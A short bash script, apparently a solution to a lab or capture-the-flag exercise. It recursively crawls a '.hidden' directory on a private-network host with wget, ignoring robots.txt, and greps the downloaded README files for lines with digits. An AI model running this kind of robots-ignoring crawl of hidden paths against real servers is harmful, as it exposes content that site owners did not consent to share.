#!/bin/bash

mkdir ./FileList;
cd ./FileList;
wget -q -np -r -A "README*" -nd -l4 -e robots=off http://192.168.197.128/.hidden/
find . -type f -name 'README*' -print0 | while IFS= read -r -d '' i; do
   cat $i | grep '[0-9]'
done